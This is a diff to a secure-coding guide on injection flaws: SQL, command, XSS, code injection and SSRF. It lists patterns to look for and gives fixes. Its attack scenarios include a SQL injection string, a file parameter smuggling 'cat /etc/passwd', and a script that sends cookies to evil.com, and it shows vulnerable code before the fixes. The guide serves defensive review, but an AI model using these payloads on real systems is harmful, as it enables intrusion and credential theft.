@@ -19,29 +19,34 @@ Injection is #5 in OWASP Top 10:2025 (down from #3). 100% of applications were t
 ## What to Look For
 
 ### SQL Injection
+
 - String concatenation in SQL queries (instead of parameterized queries)
 - Template literals embedding user input directly into SQL
 - ORM methods with raw query options using unsanitized input
 - Dynamic table/column names from user input
 
 ### Command Injection
+
 - `exec()`, `spawn()`, `system()`, `popen()` with user-controlled arguments
 - Shell command strings built with user input concatenation
 - `child_process` usage with unsanitized input
 
 ### Cross-Site Scripting (XSS)
+
 - `dangerouslySetInnerHTML` in React without sanitization
 - `innerHTML`, `outerHTML`, `document.write()` with user data
 - Template rendering of unsanitized user input
 - URL parameters reflected into HTML without encoding
 
 ### Code Injection
+
 - `eval()` with user-controlled input
 - `Function()` constructor with user input
 - `setTimeout`/`setInterval` with string arguments from user input
 - Dynamic `import()` with user-controlled paths
 
 ### Server-Side Request Forgery (SSRF)
+
 - HTTP requests where the URL is user-controlled
 - URL parsing/fetching endpoints without allowlist validation
 - Image/preview/proxy endpoints fetching arbitrary URLs
@@ -72,6 +77,7 @@ request\.get\(.*user|requests\.get\(.*param
 ```
 
 ### JavaScript / TypeScript / Node.js
+
 - Template literals in SQL: `` `SELECT * FROM users WHERE id = ${req.params.id}` ``
 - `exec(command)` where command includes user input
 - `dangerouslySetInnerHTML={{ __html: userContent }}`
@@ -79,12 +85,14 @@ request\.get\(.*user|requests\.get\(.*param
 - `fetch(req.query.url)` in preview/proxy endpoints
 
 ### Python (Django/Flask)
+
 - `cursor.execute(f"SELECT ... {user_input}")` — use parameterized queries
 - `os.system(f"command {user_input}")` — use subprocess with shell=False
 - `eval(request.data)` or `exec(request.data)`
 - Jinja2 `|safe` filter on user input
 
 ### Java (Spring)
+
 - `Statement.executeQuery()` with concatenated SQL (use `PreparedStatement`)
 - `Runtime.getRuntime().exec()` with user input
 - JSP `<%= request.getParameter() %>` without encoding
@@ -103,15 +111,19 @@ request\.get\(.*user|requests\.get\(.*param
 ## Example Attack Scenarios
 
 **Scenario 1 — SQL Injection:**
+
 ```
 https://example.com/search?q=' OR '1'='1
 ```
+
 Query becomes: `SELECT * FROM items WHERE name = '' OR '1'='1'` — returns all records.
 
 **Scenario 2 — Command Injection:**
+
 ```
 https://example.com/export?file=report;cat /etc/passwd
 ```
+
 Server executes: `convert report;cat /etc/passwd` — leaks system files.
 
 **Scenario 3 — XSS:**
@@ -120,30 +132,31 @@ User stores `<script>document.location='https://evil.com/steal?c='+document.cook
 ## Fix Examples
 
 **Before (SQL injection):**
+
 ```typescript
 const query = `SELECT * FROM notes WHERE title LIKE '%${searchTerm}%'`;
 const results = db.all(query);
 ```
 
 **After (parameterized query):**
+
 ```typescript
-const results = db.all(
-  'SELECT * FROM notes WHERE title LIKE ?',
-  [`%${searchTerm}%`]
-);
+const results = db.all("SELECT * FROM notes WHERE title LIKE ?", [`%${searchTerm}%`]);
 ```
 
 **Before (command injection):**
+
 ```typescript
-const { exec } = require('child_process');
+const { exec } = require("child_process");
 exec(`convert ${req.query.filename} output.pdf`);
 ```
 
 **After (safe alternative):**
+
 ```typescript
-const { execFile } = require('child_process');
+const { execFile } = require("child_process");
 const safeName = path.basename(req.query.filename);
-execFile('convert', [safeName, 'output.pdf']);
+execFile("convert", [safeName, "output.pdf"]);
 ```
 
 ## References
